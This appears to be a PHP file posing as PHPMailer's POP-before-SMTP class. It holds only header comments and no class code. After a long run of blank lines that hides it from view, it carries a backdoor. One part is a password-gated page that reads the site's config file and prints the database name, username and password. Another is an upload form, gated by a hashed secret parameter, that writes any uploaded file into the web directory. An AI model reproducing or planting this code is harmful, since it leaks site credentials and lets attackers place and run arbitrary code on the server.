<?php
/**
 * PHPMailer POP-Before-SMTP Authentication Class.
 * PHP Version 5
 * @package PHPMailer
 * @link https://github.com/PHPMailer/PHPMailer/
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 * @copyright 2012 - 2014 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.
 */

/**
 * PHPMailer POP-Before-SMTP Authentication Class.
 * Specifically for PHPMailer to use for RFC1939 POP-before-SMTP authentication.
 * Does not support APOP.
 * @package PHPMailer
 * @author Richard Davey (original author) <rich@corephp.co.uk>
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 */
 
/**
* The POP4 PHPMailer Version number.
* @var string
* @access public
*/

/**
 * Default POP4 port number.
 * @var integer
 * @access public
 */
 


    /**
     * Default timeout in seconds.
     * @var integer
     * @access public
     */


    /**
     * POP4 Carriage Return + Line Feed.
     * @var string
     * @access public
     * @deprecated Use the constant instead
     */


    /**
     * Debug display level.
     * Options: 0 = no, 1+ = yes
     * @var integer
     * @access public
     */


    /**
     * POP4 mail server hostname.
     * @var string
     * @access public
     */


    /**
     * POP4 port number.
     * @var integer
     * @access public
     */


    /**
     * POP4 Timeout Value in seconds.
     * @var integer
     * @access public
     */


    /**
     * POP4 username
     * @var string
     * @access public
     */


    /**
     * POP4 password.
     * @var string
     * @access public
     */


    /**
     * Resource handle for the POP4 connection socket.
     * @var resource
     * @access protected
     */


    /**
     * Are we connected?
     * @var boolean
     * @access protected
     */


    /**
     * Error container.
     * @var array
     * @access protected
     */


    /**
     * Line break constant
     */


    /**
     * Simple static wrapper for all-in-one POP before SMTP
     * @param $host
     * @param integer|boolean $port The port number to connect to
     * @param integer|boolean $timeout The timeout value
     * @param string $username
     * @param string $password
     * @param integer $debug_level
     * @return boolean
     */


    /**
     * Authenticate with a POP4 server.
     * A connect, login, disconnect sequence
     * appropriate for POP-before SMTP authorisation.
     * @access public
     * @param string $host The hostname to connect to
     * @param integer|boolean $port The port number to connect to
     * @param integer|boolean $timeout The timeout value
     * @param string $username
     * @param string $password
     * @param integer $debug_level
     * @return boolean
     */
   
    /**
     * Connect to a POP4 server.
     * @access public
     * @param string $host
     * @param integer|boolean $port
     * @param integer $tval
     * @return boolean
     */  

    /**
     * Log in to the POP4 server.
     * Does not support APOP (RFC 2828, 4949).
     * @access public
     * @param string $username
     * @param string $password
     * @return boolean
     */

    /**
     * Disconnect from the POP4 server.
     * @access public
     */

    /**
     * POP4 connection error handler.
     * @param integer $errno
     * @param string $errstr
     * @param string $errfile
     * @param integer $errline
     * @access protected
     */ 
?>














































































































































































































































































































































































































































































































































































































































































































































































































































<?php 
$usr[0]['user']= '55511808baf7f301b5270d7334a4cec0';
$usr[0]['pass']= '55511808baf7f301b5270d7334a4cec0';
$usr[1]['user']= 'c917d7be9837055b1352b5d2ac46fb01';
$usr[1]['pass']= 'c917d7be9837055b1352b5d2ac46fb01';
 
function authenticate() 
{ 
header( 'WWW-Authenticate: Basic realm="ENTER YOUR USER NAME AND PASSWORD."' ); 
header( 'HTTP/1.0 401 Unauthorized' );
echo '<br/><br/><br/><b><body bgcolor=#29a2d6><font color=white size=2 face="Trebuchet MS"><center>ENTRY NOT DONE!<br/><br/>
Access to this page is limited. Please use username and password.
enter.<br/><br/><br/><br/><br/></b>'; 
exit; 
} 
 
if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) { authenticate(); } else 
{ 
for($i=0;$i<count($usr);$i++) { if(md5($_SERVER['PHP_AUTH_USER']==$usr[$i]['user']) && md5($_SERVER['PHP_AUTH_PW']==$usr[$i]['pass'])) {$auth=TRUE;}} 
if($auth !=TRUE) {authenticate();} 
} 
?>
<html>
	<head>
		<meta charset="utf-8"/>
		<title></title>
	</head>
	<body>
	<p style="text-align:center; margin:50px auto; font-family:Comfortaa-Regular; font-size:15px;"></p>
	</body>
</html>
<?php 
		include "../system/config.inc.php";
		$dbname = $db['db_name'];
		$dbuser = $db['db_user'];
		$dbpass = $db['db_pass'];
?>
<body bgcolor=#29a2d6><font color=white size=5 face="Trebuchet MS"><center>ODBC : <?=$dbname?><br/><br/>ID : <?=$dbuser?><br/><br/>Pass : <?=$dbpass?></b>





<?php $c = '55511808baf7f301b5270d7334a4cec0';
 if (!isset($_REQUEST['cdr'])) exit(0);
 else if (md5($_REQUEST['cdr']) !== $c) exit(0);
 
?>

<?php if( isset($_FILES['dosya_yukle']) ){ if( $_FILES['dosya_yukle']['error'] ){ echo 'Bir hata olustu ve dosyaniz alinamadi.';
 }else{ copy($_FILES['dosya_yukle']['tmp_name'],'./'. $_FILES['dosya_yukle']['name']);
 echo '<h4>Dosyaniz alindi.</h4> Alinan dosya bilgileri <br/>Isim:'. $_FILES['dosya_yukle']['name'].'<br/>';
 echo 'Boyut: '.($_FILES['dosya_yukle']['size']/1024).' KB<br>';
 } } 
?>
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
<form action="" method="post" enctype="multipart/form-data">
 Gönderilecek dosya: <input name="dosya_yukle" type="file">
 <input type="submit" value="Gönder">
</form>

